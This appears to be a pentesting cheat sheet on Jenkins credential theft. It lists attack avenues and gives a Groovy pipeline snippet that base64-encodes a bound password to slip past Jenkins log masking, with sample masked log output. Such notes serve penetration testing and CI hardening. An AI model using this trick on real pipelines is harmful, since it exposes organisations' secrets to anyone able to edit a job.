# Credentials

- Credentials in Logs
- Credentials in Description
- Credentials dumping from jobs ( Logged in Used / Users who can modify pipelines )
- Credentials dumping as an administrator.
- Kickoff builds using PR from public repo


### Credentials Dumping


- Credentials Bindings ( https://www.jenkins.io/doc/pipeline/steps/credentials-binding/ )
``` Groovy
stages {
        stage('Curl') {
            steps {
                withCredentials(
                    [usernamePassword(credentialsId: 'mycredentials', usernameVariable: 'user', passwordVariable : 'pass')]
                ) {
                    sh '''
                        echo "$pass" | base64
                    '''
                }
            }
        }
```
- When used without base64
```
[Pipeline] stage
[Pipeline] { (Curl)
[Pipeline] withCredentials
Masking supported pattern matches of $user or $pass
[Pipeline] {
[Pipeline] sh
+ echo ****
****
[Pipeline] }
[Pipeline] // withCredentials
[Pipeline] }
[Pipeline] // stage
```
